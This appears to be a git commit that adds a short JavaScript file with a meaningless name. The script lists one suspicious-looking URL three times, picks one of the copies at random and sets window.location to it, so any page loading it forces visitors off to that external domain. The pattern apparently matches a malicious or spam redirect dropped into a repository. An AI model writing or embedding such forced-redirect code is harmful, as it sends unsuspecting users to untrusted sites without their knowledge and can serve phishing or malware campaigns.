1cf3ae049cd6fe3f4e7795e557f1b40baec7b14d
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-04-08 22:22:14 +0700

    Create akehilltadss.js

---
+++ akehilltadss.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://villainoussession.com/pCZkVj',
+
+  'https://villainoussession.com/pCZkVj',
+
+  'https://villainoussession.com/pCZkVj'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
